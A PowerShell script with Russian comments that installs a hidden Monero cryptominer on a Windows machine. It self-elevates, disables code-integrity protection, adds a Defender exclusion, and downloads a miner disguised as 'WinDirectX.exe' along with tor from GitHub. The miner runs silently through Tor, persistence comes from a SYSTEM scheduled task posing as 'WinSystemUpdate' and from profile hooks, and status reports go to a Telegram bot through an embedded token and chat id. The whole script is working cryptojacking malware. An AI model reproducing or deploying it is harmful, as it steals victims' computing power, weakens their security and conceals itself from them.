# =========================================================
# УЛЬТИМАТИВНЫЙ СКРИПТ УПРАВЛЕНИЯ (V12.0 - HYBRID)
# =========================================================

# 1. ПРОВЕРКА АДМИНА
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# 2. СНЯТИЕ ОГРАНИЧЕНИЙ И TLS 1.2
Set-ExecutionPolicy Bypass -Scope Process -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 3. КОНФИГУРАЦИЯ
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
$user = "Isfandiyor0112-star"
$tgToken = "8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE"
$chatId = "6881699459"
$pcName = $env:COMPUTERNAME

# 4. КОМАНДЫ ПРОФИЛЯ + ФУНКЦИИ (check, log, update, delete)
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$profileDir = Split-Path $profilePath
if (!(Test-Path $profileDir)) { New-Item -Type Directory -Path $profileDir -Force | Out-Null }

$Functions = @"
# Включаем TLS 1.2 для функций профиля
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function send-tg {
    param([string]`$msg)
    `$url = "https://api.telegram.org/bot$tgToken/sendMessage"
    `$body = @{ chat_id = "$chatId"; text = "[`$env:COMPUTERNAME]: `$msg" }
    try { Invoke-RestMethod -Uri `$url -Method Post -Body `$body -ErrorAction SilentlyContinue } catch {}
}

function check {
    `$p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
    `$t = Get-Process "tor" -ErrorAction SilentlyContinue
    `$status = if (`$p) { "МАЙНЕР: OK (" + [Math]::Round(`$p.WorkingSet64 / 1MB, 2) + " MB)" } else { "МАЙНЕР: OFF" }
    `$status += if (`$t) { " | TOR: OK" } else { " | TOR: OFF" }
    Write-Host `$status -ForegroundColor Green
    send-tg "Ручной чек: `$status"
}

function log { 
    Write-Host "--- Нажмите Ctrl+C для выхода ---" -ForegroundColor Cyan
    Get-Content "$path\miner.log" -Tail 30 -Wait 
}

function update {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-Host "--- ОБНОВЛЕНИЕ ---" -ForegroundColor Cyan
    send-tg "⏳ Обновляюсь..."
    Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe" -UserAgent "Mozilla/5.0"
    Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe" -UserAgent "Mozilla/5.0"
    Start-Process -FilePath "$path\win_start.vbs"
    send-tg "✅ Обновлен!"
}

function delete {
    Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "WinSystemUpdate" -Confirm:`$false -ErrorAction SilentlyContinue
    send-tg "⚠️ УДАЛЕН С ПК"
}
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 5. ПОДГОТОВКА ПАПКИ И АНТИ-СОН
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# Настройка питания (Анти-сон)
powercfg /hibernate off
powercfg /x -hibernate-timeout-ac 0
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5

# 6. ЗАГРУЗКА ФАЙЛОВ С АВТО-EXE
Write-Host "--- ЗАГРУЗКА КОМПОНЕНТОВ ---" -ForegroundColor Cyan
try {
    if (!(Test-Path "$path\WinDirectX.exe")) {
        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe" -UserAgent "Mozilla/5.0"
    }
    if (!(Test-Path "$path\tor.exe")) {
        Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe" -UserAgent "Mozilla/5.0"
    }
} catch { Write-Host "❌ Ошибка загрузки" -ForegroundColor Red }

# 7. СОЗДАНИЕ ТИХОГО ЗАПУСКА
$cmd = "@echo off`ntasklist /FI `"IMAGENAME eq WinDirectX.exe`" | find /I `"WinDirectX.exe`" >NUL`nif %ERRORLEVEL%==0 exit`ntimeout /t 15 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p %COMPUTERNAME% --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii

$vbs = "Set W = CreateObject(`"WScript.Shell`")`nW.Run `"$path\tor.exe`", 0, False`nW.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 8. ПЛАНИРОВЩИК
$TaskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$path\win_start.vbs`""
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WinSystemUpdate" -Action $TaskAction -Trigger $TaskTrigger -User "SYSTEM" -RunLevel Highest -Force

# 9. СТАРТ И МОНИТОРИНГ
if (!(Get-Process "WinDirectX" -ErrorAction SilentlyContinue)) { Start-Process -FilePath "$path\win_start.vbs" }

$Monitor = {
    param($tgToken, $chatId, $path)
    while($true) {
        $cpu = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
        $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
        $status = if ($p) { "✅ OK (ЦП: $cpu%)" } else { "⚠️ ВЫЛЕТ! Перезапуск..." }
        if (!$p) { Start-Process -FilePath "$path\win_start.vbs" -ErrorAction SilentlyContinue }
        
        $body = @{ chat_id = $chatId; text = "[$env:COMPUTERNAME]`n$status" }
        try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body $body } catch {}
        Start-Sleep -Seconds 3600
    }
}
Start-Job -ScriptBlock $Monitor -ArgumentList $tgToken, $chatId, $path

Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body @{chat_id=$chatId; text="[$pcName]: 🚀 СИСТЕМА АКТИВИРОВАНА!"}
Write-Host "--- ГОТОВО ---" -ForegroundColor Magenta
